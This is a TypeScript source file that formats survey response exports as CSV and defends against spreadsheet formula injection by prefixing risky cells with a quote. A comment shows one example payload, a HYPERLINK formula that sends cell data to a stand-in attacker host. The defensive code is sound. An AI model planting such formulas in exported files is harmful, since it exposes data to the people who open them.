/** Pure CSV formatting for response export, kept free of the Supabase import so it can be unit tested directly. */

export function csvCell(value: unknown): string {
  if (value === null || value === undefined) return '';
  let s = Array.isArray(value) ? value.join('; ') : String(value);
  // CSV/formula injection defense: a cell starting with =, +, -, @, a tab or
  // a carriage return is interpreted by Excel/Google Sheets as the start of
  // a formula when this file is opened there - so a respondent's own
  // free-text answer (e.g. "=HYPERLINK(\"https://evil/\"&A1)") could run a
  // formula, or exfiltrate other cells' data, in whoever exports and opens
  // it. A leading single quote forces the cell to plain text in every major
  // spreadsheet application without changing what a human reader sees.
  if (/^[=+\-@\t\r]/.test(s)) s = `'${s}`;
  return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

export function toCsv(rows: Record<string, unknown>[]): string {
  if (rows.length === 0) return '';
  const headers = Object.keys(rows[0]);
  const lines = [headers.join(',')];
  for (const row of rows) lines.push(headers.map(h => csvCell(row[h])).join(','));
  return lines.join('\r\n');
}
